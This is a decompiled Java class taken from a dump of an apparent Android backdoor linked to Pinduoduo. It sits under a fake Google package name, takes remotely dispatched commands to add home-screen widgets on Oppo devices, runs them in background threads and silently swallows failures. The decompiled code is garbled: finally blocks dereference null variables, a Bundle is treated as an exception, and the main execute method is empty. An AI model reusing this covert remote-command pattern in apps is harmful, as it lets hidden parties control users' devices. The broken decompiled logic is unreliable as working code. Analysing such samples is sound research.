package com.google.android.sd.biz_dynamic_dex.oppoaddwidget;

import android.content.Context;
import android.os.Bundle;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.IProxyClient;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class OppoAddWidgetBizExecutor implements IProxyClient {
  private OppoAddWidgetCore oppoAddWidgetCore;
  
  public Bundle createRequestBundle(Context paramContext, CmdData paramCmdData) {
    try {
      String str = (new JSONObject(paramCmdData.getParams())).optString("component");
      if (TextUtils.isEmpty(str)) {
        handleError(paramContext, paramCmdData, "invalid_params");
        return null;
      } 
      Bundle bundle = new Bundle();
      bundle.putString("BUNDLE_REQUEST_WIDGET", str);
      return bundle;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("create_request_error");
      stringBuilder.append(exception.getMessage());
      handleError(paramContext, paramCmdData, stringBuilder.toString());
      return null;
    } 
  }
  
  public void execute(final Context context, final CmdData data) {
    Utils.runInNewThread(new Runnable() {
          public void run() {
            try {
              OppoAddWidgetBizExecutor.this.realExecute(context, data);
              return;
            } catch (Exception exception) {
              return;
            } 
          }
        });
  }
  
  public void handleError(Context paramContext, CmdData paramCmdData, String paramString) {
    try {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(paramCmdData, paramString, null));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public void parseResponseResult(Context paramContext, CmdData paramCmdData, Bundle paramBundle) {
    try {
      return;
    } finally {
      paramBundle = null;
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("parse_response_error_");
      stringBuilder.append(paramBundle.getMessage());
      handleError(paramContext, paramCmdData, stringBuilder.toString());
    } 
  }
  
  protected void realExecute(Context paramContext, CmdData paramCmdData) throws Exception {
    try {
      return;
    } finally {
      Exception exception = null;
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("real_execute_error: ");
      stringBuilder.append(exception.getMessage());
      handleError(paramContext, paramCmdData, stringBuilder.toString());
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppoaddwidget\OppoAddWidgetBizExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */